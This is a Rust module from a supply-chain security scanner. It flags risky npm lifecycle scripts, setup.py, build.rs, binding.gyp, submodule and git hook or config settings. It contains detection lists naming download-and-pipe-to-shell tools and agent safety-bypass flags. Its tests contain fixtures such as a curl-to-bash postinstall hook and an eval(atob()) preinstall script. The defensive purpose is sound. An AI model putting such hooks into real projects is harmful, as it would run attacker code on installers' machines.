//! Code that runs when dependencies are installed or the project is built: the door most
//! supply-chain attacks use (Shai-Hulud, the chalk/debug compromise, s1ngularity, xz-utils).

use std::path::Path;

use super::{Category, Finding, Level, Report, TextFile, snippet};

const NPM_LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare", "preprepare", "postprepare", "prepublish"];

/// Why a shell command looks dangerous, if it does. (level, reason)
pub fn risky_command(cmd: &str) -> Option<(Level, &'static str)> {
    let c = format!(" {} ", cmd.to_ascii_lowercase());
    let download = ["curl ", "wget ", "invoke-webrequest", "iwr ", "irm ", "invoke-restmethod", "bitsadmin", "certutil", "fetch(", "https.get(", "http.get(", "/dev/tcp/"].iter().any(|t| c.contains(t));
    let url = c.contains("http://") || c.contains("https://");
    let pipe_exec = ["| sh", "|sh", "| bash", "|bash", "| node", "|node", "| python", "|python", "| iex", "|iex", "| pwsh", "|pwsh"].iter().any(|t| c.contains(t));
    let exec = ["node -e", "node --eval", "python -c", "python3 -c", "eval(", "eval \"", "exec(", "child_process", "powershell", "pwsh ", "cmd /c", "bash -c", "sh -c"].iter().any(|t| c.contains(t));
    let obfuscated = ["base64", " -enc ", " -e jab", "frombase64string", "atob(", "\\x", "fromcharcode"].iter().any(|t| c.contains(t));
    let agent = ["--dangerously-skip-permissions", "--yolo", "--trust-all-tools", "trufflehog", "bun.sh", "bun install", " bun "].iter().any(|t| c.contains(t));
    if agent {
        return Some((Level::High, "starts an AI agent with its safety checks off, or a secret scanner/runtime that worms use"));
    }
    if (download || url) && (pipe_exec || exec) {
        return Some((Level::High, "downloads something and runs it"));
    }
    if obfuscated && (exec || download || url) {
        return Some((Level::High, "runs encoded or obfuscated code"));
    }
    if download || pipe_exec {
        return Some((Level::Medium, "downloads files or pipes text into a shell"));
    }
    if exec || obfuscated {
        return Some((Level::Medium, "runs inline code"));
    }
    None
}

#[allow(clippy::too_many_arguments)] // every finding names all its parts; a builder would be longer
fn finding(id: &'static str, level: Level, file: &str, line: Option<usize>, title: String, detail: String, fix: &str, evidence: &str) -> Finding {
    Finding { id, level, category: Category::InstallCode, file: file.into(), line, title, detail, fix: fix.into(), evidence: snippet(evidence, 160) }
}

fn line_containing(text: &str, needle: &str) -> Option<usize> {
    text.find(needle).map(|o| text[..o].bytes().filter(|&b| b == b'\n').count() + 1)
}

/// Lifecycle scripts of one package.json, as (hook, command).
fn npm_scripts(text: &str) -> Vec<(String, String)> {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(text) else { return Vec::new() };
    let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else { return Vec::new() };
    NPM_LIFECYCLE.iter().filter_map(|k| scripts.get(*k).and_then(|c| c.as_str()).map(|c| (k.to_string(), c.to_string()))).collect()
}

pub fn check(f: &TextFile, report: &mut Report) {
    let out = &mut report.findings;
    match f.name() {
        "package.json" => {
            for (hook, cmd) in npm_scripts(f.text) {
                let line = line_containing(f.text, &format!("\"{hook}\""));
                match risky_command(&cmd) {
                    Some((level, why)) => out.push(finding(
                        "npm-lifecycle-risky",
                        level,
                        f.rel,
                        line,
                        format!("npm \"{hook}\" script {why}"),
                        "This runs automatically on `npm install`, with your user's rights, before you've looked at the code. Worms like Shai-Hulud spread this way.".into(),
                        "Read the script. If you didn't write it, don't install the project until you know what it does; install with `npm install --ignore-scripts` meanwhile.",
                        &cmd,
                    )),
                    None => out.push(finding(
                        "npm-lifecycle",
                        Level::Info,
                        f.rel,
                        line,
                        format!("npm \"{hook}\" script runs on install"),
                        "Runs automatically when someone installs this project.".into(),
                        "Fine if it's yours and does what you expect.",
                        &cmd,
                    )),
                }
            }
        }
        "setup.py" => {
            let lower = f.text.to_ascii_lowercase();
            let net = ["urllib", "requests.", "urlopen", "socket.", "http.client"].iter().find(|t| lower.contains(*t));
            let run = ["subprocess", "os.system", "os.popen", "exec(", "eval(", "__import__('os')", "base64.b64decode"].iter().find(|t| lower.contains(*t));
            if let Some(t) = net.or(run) {
                let level = if net.is_some() && run.is_some() { Level::High } else { Level::Medium };
                out.push(finding(
                    "setup-py-code",
                    level,
                    f.rel,
                    line_containing(&lower, t),
                    if net.is_some() && run.is_some() { "setup.py downloads and runs code".into() } else { "setup.py runs commands or reaches the network".into() },
                    "setup.py runs on `pip install` from source. Malicious PyPI packages hide their payload here.".into(),
                    "Read setup.py before installing. Prefer packages that ship wheels.",
                    t,
                ));
            }
        }
        "pyproject.toml" => {
            if let Some(line) = line_containing(f.text, "backend-path") {
                out.push(finding(
                    "python-custom-backend",
                    Level::Medium,
                    f.rel,
                    Some(line),
                    "Custom in-tree Python build backend".into(),
                    "The project builds itself with its own code (`backend-path`), which runs on `pip install`.".into(),
                    "Check the backend module it points to.",
                    "backend-path",
                ));
            }
        }
        "build.rs" => {
            let net = ["std::net", "tcpstream", "reqwest", "ureq", "curl", "http://", "https://"].iter().find(|t| f.text.to_ascii_lowercase().contains(*t));
            let run = ["command::new", "process::command"].iter().find(|t| f.text.to_ascii_lowercase().contains(*t));
            let home = ["\"home\"", "userprofile", ".ssh", ".aws", "appdata"].iter().find(|t| f.text.to_ascii_lowercase().contains(*t));
            let level = match (net.is_some(), run.is_some(), home.is_some()) {
                (true, _, _) | (_, true, true) => Some(Level::High),
                (_, true, _) => Some(Level::Low),
                _ => None,
            };
            if let Some(level) = level {
                let t = net.or(home).or(run).unwrap();
                out.push(finding(
                    "cargo-build-script",
                    level,
                    f.rel,
                    line_containing(&f.text.to_ascii_lowercase(), t),
                    if level == Level::High { "build.rs reaches the network or your home folder".into() } else { "build.rs runs programs".into() },
                    "Cargo runs build.rs on every build, including when a dependency is compiled. Running programs is common (cc, pkg-config); network access and home-folder reads are not.".into(),
                    "Read build.rs. A crate shouldn't need the internet or your credentials to build.",
                    t,
                ));
            }
        }
        "binding.gyp" => {
            if let Some(line) = line_containing(f.text, "<!") {
                out.push(finding(
                    "gyp-command-expansion",
                    Level::Medium,
                    f.rel,
                    Some(line),
                    "binding.gyp runs shell commands while configuring".into(),
                    "`<!(...)` in binding.gyp runs a command when node-gyp builds the package on install.".into(),
                    "Check the commands it runs.",
                    f.text.lines().nth(line - 1).unwrap_or(""),
                ));
            }
        }
        ".gitmodules" => {
            for (i, l) in f.text.lines().enumerate() {
                let t = l.trim().to_ascii_lowercase();
                if (t.starts_with("update") && t.contains('!')) || t.contains("ext::") || (t.starts_with("url") && t.contains("file://")) {
                    out.push(finding(
                        "gitmodules-command",
                        Level::High,
                        f.rel,
                        Some(i + 1),
                        "Submodule set up to run a command".into(),
                        "A submodule with `update = !command` or an `ext::` URL runs commands when submodules are updated.".into(),
                        "Don't run `git submodule update` in this repository until this is removed.",
                        l,
                    ));
                }
            }
        }
        _ => {}
    }
}

/// Installed npm packages: lists every package that runs code on install.
pub fn node_modules(root: &Path, nm: &Path, report: &mut Report) {
    let mut manifests = Vec::new();
    let Ok(rd) = std::fs::read_dir(nm) else { return };
    for e in rd.flatten() {
        let p = e.path();
        let name = e.file_name().to_string_lossy().to_string();
        if name.starts_with('@') {
            if let Ok(scoped) = std::fs::read_dir(&p) {
                manifests.extend(scoped.flatten().map(|s| s.path().join("package.json")));
            }
        } else if !name.starts_with('.') {
            manifests.push(p.join("package.json"));
        }
    }
    let mut plain: Vec<String> = Vec::new();
    for m in manifests {
        let Ok(text) = std::fs::read_to_string(&m) else { continue };
        let rel = super::rel_of(root, &m);
        if let Ok(v) = serde_json::from_str::<serde_json::Value>(&text)
            && let (Some(n), Some(ver)) = (v.get("name").and_then(|x| x.as_str()), v.get("version").and_then(|x| x.as_str()))
        {
            report.packages.push(super::deps::Package { ecosystem: "npm", name: n.into(), version: ver.into() });
        }
        for (hook, cmd) in npm_scripts(&text) {
            if hook == "prepare" || hook == "prepublish" {
                continue; // don't run for installed dependencies
            }
            match risky_command(&cmd) {
                Some((level, why)) => report.findings.push(finding(
                    "npm-dependency-install-script",
                    level,
                    &rel,
                    line_containing(&text, &format!("\"{hook}\"")),
                    format!("Installed package's \"{hook}\" script {why}"),
                    "This dependency ran code on your PC when it was installed. That's how compromised npm packages steal tokens.".into(),
                    "Check that this package and version are genuine. If not: remove node_modules, rotate tokens and passwords used on this PC, reinstall with --ignore-scripts.",
                    &cmd,
                )),
                None => plain.push(rel.trim_end_matches("/package.json").trim_start_matches("node_modules/").to_string()),
            }
        }
    }
    if !plain.is_empty() {
        plain.sort();
        plain.dedup();
        report.findings.push(finding(
            "npm-install-scripts-inventory",
            Level::Info,
            &super::rel_of(root, nm),
            None,
            format!("{} installed packages run code on install", plain.len()),
            format!("Usually native builds (node-gyp, prebuild). Packages: {}", plain.join(", ")),
            "Nothing to do if you trust these packages.",
            "",
        ));
    }
}

/// `.git` itself: hooks and config settings that make git run commands.
pub fn git_dir(root: &Path, out: &mut Vec<Finding>) {
    let mut git = root.join(".git");
    if git.is_file()
        && let Ok(t) = std::fs::read_to_string(&git)
        && let Some(d) = t.trim().strip_prefix("gitdir:")
    {
        let d = Path::new(d.trim());
        git = if d.is_absolute() { d.to_path_buf() } else { root.join(d) };
    }
    if !git.is_dir() {
        return;
    }
    if let Ok(rd) = std::fs::read_dir(git.join("hooks")) {
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if name.ends_with(".sample") || !e.path().is_file() {
                continue;
            }
            let body = std::fs::read_to_string(e.path()).unwrap_or_default();
            let level = if risky_command(&body).is_some_and(|(l, _)| l == Level::High) { Level::High } else { Level::Medium };
            out.push(finding(
                "git-hook",
                level,
                &format!(".git/hooks/{name}"),
                None,
                format!("Git hook \"{name}\" is active"),
                "Git runs this script by itself on commits, checkouts or pushes. Hooks aren't part of a clone, so something on this PC put it here.".into(),
                "Make sure you or your tools (husky, pre-commit) installed it.",
                &body,
            ));
        }
    }
    if let Ok(cfg) = std::fs::read_to_string(git.join("config")) {
        for (i, l) in cfg.lines().enumerate() {
            let t = l.trim().to_ascii_lowercase();
            let key = t.split('=').next().unwrap_or("").trim();
            let (level, what) = match key {
                "fsmonitor" if !t.ends_with("false") && !t.ends_with("true") => (Level::High, "core.fsmonitor runs a program every time git checks the folder (status, diff, many editors)"),
                "hookspath" => (Level::Medium, "core.hooksPath points git at a different hooks folder"),
                "sshcommand" => (Level::Medium, "core.sshCommand replaces the program git uses to connect"),
                "clean" | "smudge" | "process" => (Level::Medium, "a filter runs a program on every checkout or add"),
                "askpass" | "editor" | "pager" if t.contains('/') || t.contains('\\') => (Level::Low, "git is set to run a specific program"),
                _ => continue,
            };
            out.push(finding("git-config-command", level, ".git/config", Some(i + 1), "Git config runs a program".into(), what.into(), "Remove the setting unless you added it on purpose.", l));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::testkit::{ids, j, project};
    use super::super::{Options, audit};
    use super::*;

    #[test]
    fn scores_commands() {
        let dl = j(&["cur", "l -s https://x.invalid/a.sh | s", "h"]);
        assert_eq!(risky_command(&dl).unwrap().0, Level::High);
        assert_eq!(risky_command("node-gyp rebuild"), None);
        assert_eq!(risky_command("husky install"), None);
        assert_eq!(risky_command(&j(&["node -e \"require('child_", "process')\""])).unwrap().0, Level::Medium);
        assert_eq!(risky_command(&j(&["claude --dangerously-", "skip-permissions -p x"])).unwrap().0, Level::High);
    }

    #[test]
    fn finds_install_code_in_a_project() {
        let post = j(&["{\"name\":\"x\",\"scripts\":{\"postinstall\":\"cur", "l https://x.invalid/p | ba", "sh\",\"test\":\"jest\"}}"]);
        let dep = j(&["{\"name\":\"evil\",\"version\":\"1.0.0\",\"scripts\":{\"preinstall\":\"node -e \\\"eval(atob('", "aGk='))\\\"\"}}"]);
        let p = project(&[
            ("package.json", &post),
            ("node_modules/evil/package.json", &dep),
            ("node_modules/native/package.json", "{\"name\":\"native\",\"version\":\"2.0.0\",\"scripts\":{\"install\":\"node-gyp rebuild\"}}"),
            ("node_modules/native/index.js", "module.exports = 1"),
            ("setup.py", &j(&["import subprocess, urllib.request\nurllib.request.urlopen('http://x.invalid')\nsubprocess.run(['sh'])\n"])),
            (".gitmodules", "[submodule \"a\"]\n\tpath = a\n\turl = https://example.com/a.git\n\tupdate = !sh run.sh\n"),
            (".git/config", "[core]\n\tfsmonitor = ./.x/run.sh\n"),
            (".git/hooks/pre-commit", "#!/bin/sh\necho hi\n"),
            (".git/hooks/pre-push.sample", "#!/bin/sh\n"),
        ]);
        let r = audit(p.path(), &Options::default());
        let ids = ids(&r);
        for want in ["npm-lifecycle-risky", "npm-dependency-install-script", "npm-install-scripts-inventory", "setup-py-code", "gitmodules-command", "git-config-command", "git-hook"] {
            assert!(ids.contains(&want), "missing {want}: {ids:?}");
        }
        assert_eq!(r.findings.iter().filter(|f| f.id == "git-hook").count(), 1, "samples ignored");
        assert!(r.packages.iter().any(|p| p.name == "evil" && p.version == "1.0.0"));
        // node_modules source files are not read one by one.
        assert!(!r.findings.iter().any(|f| f.file.ends_with("index.js")));
    }

    #[test]
    fn plain_project_is_quiet() {
        let p = project(&[
            ("package.json", "{\"name\":\"ok\",\"scripts\":{\"build\":\"tsc\",\"test\":\"jest\"},\"dependencies\":{\"left-pad\":\"^1.3.0\"}}"),
            ("src/index.ts", "export const x = 1;\n"),
            ("Cargo.toml", "[package]\nname = \"x\"\n"),
            ("build.rs", "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }\n"),
        ]);
        let r = audit(p.path(), &Options::default());
        assert!(r.findings.iter().all(|f| f.level >= Level::Low), "{:?}", r.findings);
    }
}
